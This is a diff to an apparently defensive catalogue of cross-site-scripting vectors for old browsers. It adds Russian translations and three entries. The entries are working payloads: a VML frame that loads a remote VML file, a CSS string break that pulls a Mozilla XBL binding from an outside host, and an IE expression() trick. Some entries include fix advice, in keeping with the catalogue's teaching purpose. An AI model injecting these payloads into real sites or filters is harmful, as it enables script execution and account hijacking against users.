@@ -1032,21 +1032,28 @@ var items =
         'name'       : {
             'en' : 'VML frame with embedded VML object plus onmouseover',
             'jp' : '',
-            'ru' : '',
+            'ru' : 'VML фрейм с помещенным в него VML объектом плюс onmouseover',
             'de' : ''
         },
-        'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);width:100%;height:100%><xml><rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" /></xml></vmlframe>',
+        'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=http://heideri.ch/jso/test.vml#xss></vmlframe>',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test.vml',
+            'name'          : 'test.vml',
+            'raw'           : '<xml><rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" /></xml>'
+        },
         'description': {
-            'en' : 'A VML frame object is enclosing a VML rect object which is responding to mouseover events. The whole vector can also work by giving the VML frame a "src" attribute and have it point to another VML object. VML frames can also enclose regular HTML.',
+            'en' : 'A VML frame object works by giving the VML frame a "src" attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.',
             'jp' : '',
-            'ru' : '',
+            'ru' : 'Объект VML фрейма ссылается в атрибуте "src" на другой VML объект, который реагирует на событие движения мышью. В режиме совместимости VML фрейм может непосредственно заключать в себе VML rect объект или обычный HTML.', 
             'de' : ''
         },
         'tickets'    : [],
         'howtofix'   : {
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
             'jp' : '',
-            'ru' : '',
+            'ru' : 'Не разрешайте свойства поведений в разрешаемых пользователю стилях и разметке и не полагайтесь на черные списки опасных HTML тегов.',
             'de' : ''
         },            
         'browsers'   : {
@@ -1369,5 +1376,71 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'opera', 'css', 'hijacking', 'proprietary'],
         'reporter'   : '.mario'
+    },
+    { /* ID 45 - Opera and Firefox css-string breaking  */
+        'id'         : 45,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Opera and Firefox css-string breaking',
+            'jp' : '',
+            'ru' : 'Разрыв css-строки в Opera и Firefox',
+            'de' : ''
+        },
+        'data'       : '<div style="background:url(\'/foo/&#x0A);-moz-binding:url(http://heideri.ch/jso/moztest.xml#xss);-o-link-source:current;-o-link:&quot;%js_uri_alert%\\00\');">XXX',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '1',            
+            'path'          : 'http://heideri.ch/jso/moztest.xml',
+            'name'          : 'moztest.xml',
+            'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
+        },
+        'description': {
+            'en' : 'Opera, Firefox and other browsers allow breaking out an css-string with newline symbols. A string cannot directly contain a newline in CSS2+.',
+            'jp' : '',
+            'ru' : 'Оpera, Firefox, а также другие браузеры позволяют прервать css-строку с помощью символов новой строки. Строка не может непосредственно содержать символ новой строки согласно стандартам CSS уровня 2 и выше. Фильтры, которые не учитывают эту особенность, будут неправильно определять опасные свойства стилей.',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'opera': ['8.0', '9.0', '10.0', '10.5', 'mobile'],
+            'firefox' : ['1.x', '2.x', '3.x']
+        },
+        'tags'       : ['xss', 'javascript', 'opera', 'firefox', 'css', 'data binding'],
+        'reporter'   : 'LeverOne, .mario'
+    },
+    { /* ID 46 - Alternative css-syntax in Internet Explorer  */
+        'id'         : 46,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Alternative css-syntax in Internet Explorer',
+            'jp' : '',
+            'ru' : 'Альтернативный css-синтаксис в Internet Explorer',
+            'de' : ''
+        },
+        'data'       : '<div style="font-family:foo}x=expression(%js_write%);">XXX</div>',
+        'description': {
+            'en' : 'Internet Explorer allow to use right curly brace (}) as groups separator. A css-declaration in quirks mode may consist of a property name, followed by a symbol of equality (=).',
+            'jp' : '',
+            'ru' : 'Internet Explorer разрешает использовать правую фигурную скобку (}) в качестве группового разделителя. В режиме совместимости css-декларация также может содержать имя свойства, за которым следует знак равенства (=).',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'internet explorer': ['5.5', '6.0', '7.0', '9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'ie', 'css', 'quirks mode', 'proprietary', 'expression'],
+        'reporter'   : 'Gareth, LeverOne, sdc'
     }
 ]
